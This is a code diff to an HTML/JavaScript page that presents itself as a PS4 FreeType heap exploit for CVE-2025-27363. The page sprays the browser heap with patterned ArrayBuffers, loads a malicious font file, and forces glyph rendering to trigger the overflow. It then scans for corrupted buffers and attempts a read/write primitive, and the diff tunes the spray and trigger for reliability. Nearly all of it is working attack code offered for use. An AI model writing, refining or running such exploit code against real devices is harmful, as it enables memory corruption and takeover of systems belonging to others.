@@ -29,18 +29,20 @@
       margin-top: 1em;
       color: red;
     }
+    .ok { color: lime; }
+    .fail { color: red; }
   </style>
 </head>
 <body>
-  <h1>💣 PS4 FreeType GX Heap Exploit</h1>
+  <h1>💣 PS4 FreeType GX Heap Exploit (CVE-2025-27363)</h1>
   <button onclick="startExploit()">Start Exploit</button>
-  <div class="glyph-test" id="glyph">Init…</div>
+  <div class="glyph-test" id="glyph">%</div>
   <div class="log" id="log">Ready.</div>
   <div class="status" id="status">Idle</div>
 
   <script>
-    const SPRAY_CNT = 30000;
-    const SPRAY_SIZE = 0x100;
+    const SPRAY_CNT = 10000; // Reduced for stability
+    const SPRAY_SIZE = 0x100; // Match common alloc size
     const spray = [];
     let corruptedIdx = -1;
 
@@ -50,10 +52,11 @@
 
     function sprayHeap() {
       for (let i = 0; i < SPRAY_CNT; i++) {
-        const size = SPRAY_SIZE + ((i % 8) * 8); // slight randomization
-        const buf = new ArrayBuffer(size);
+        const buf = new ArrayBuffer(SPRAY_SIZE);
         const f64 = new BigUint64Array(buf);
-        for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343n;
+        for (let j = 0; j < f64.length; j++) {
+          f64[j] = 0x4242424242424242n; // Known pattern
+        }
         spray.push({ f64, buf });
       }
       log("[+] Heap spray complete.");
@@ -62,7 +65,7 @@
     function detectCorruption() {
       for (let i = 0; i < spray.length; i++) {
         const f64 = spray[i].f64;
-        if (f64[0] !== 0x4343434343434343n) {
+        if (f64[0] !== 0x4242424242424242n) {
           log(`[!] CORRUPTION at spray[${i}] f64[0] = ${f64[0].toString(16)}`);
           corruptedIdx = i;
           return spray[i];
@@ -73,6 +76,7 @@
     }
 
     function tryRWPrimitive(corrupted) {
+      if (!corrupted) return;
       log("[*] Trying R/W via corrupted buffer...");
       try {
         corrupted.f64[2] = 0x41414141n;
@@ -84,7 +88,7 @@
     }
 
     async function loadFont() {
-      const font = new FontFace('boom', 'url("mal.ttf?v=' + Date.now() + '")'); // cache bust
+      const font = new FontFace('boom', 'url("mal.ttf?v=' + Date.now() + '")');
       try {
         await font.load();
         document.fonts.add(font);
@@ -94,31 +98,43 @@
       }
     }
 
-    async function startExploit() {
-      document.getElementById("status").textContent = "Running...";
-      document.getElementById("status").style.color = "#ff0";
-      sprayHeap();
-      await new Promise(r => setTimeout(r, 500));
-      await loadFont();
-      await new Promise(r => setTimeout(r, 300));
+    function forceLayoutFlush() {
+      void document.getElementById("glyph").offsetWidth; // Forces reflow
+    }
 
-      // Now render glyphs that trigger the gvar write
+    async function startExploit() {
+      const statusElem = document.getElementById("status");
+      statusElem.textContent = "Running...";
+      statusElem.className = "";
+
+      log("Allocating heap spray...");
+      sprayHeap();
+
+      log("Waiting for GC...");
+      await new Promise(r => setTimeout(r, 500));
+
+      log("Loading malicious font...");
+      await loadFont();
+
+      log("Rendering glyph to trigger bug...");
       const glyphElem = document.getElementById("glyph");
-      glyphElem.innerText = '!'.repeat(300); // uni0021 = target
+      glyphElem.innerText = '%'.repeat(300); // Ensure glyph rendering
       glyphElem.style.fontFamily = 'boom';
       glyphElem.style.fontSize = '200px';
       glyphElem.style.fontVariationSettings = '"wght" 999';
 
-      await new Promise(r => setTimeout(r, 400));
+      forceLayoutFlush(); // Force layout/paint to trigger FreeType parsing
+      await new Promise(r => setTimeout(r, 800)); // Wait for render+corruption
 
+      log("Scanning for corruption...");
       const corrupted = detectCorruption();
       if (corrupted) {
         tryRWPrimitive(corrupted);
-        document.getElementById("status").textContent = "✅ CORRUPTION DETECTED";
-        document.getElementById("status").style.color = "lime";
+        statusElem.textContent = "✅ CORRUPTION DETECTED";
+        statusElem.className = "ok";
       } else {
-        document.getElementById("status").textContent = "❌ No corruption";
-        document.getElementById("status").style.color = "red";
+        statusElem.textContent = "❌ NO CORRUPTION";
+        statusElem.className = "fail";
       }
     }
   </script>
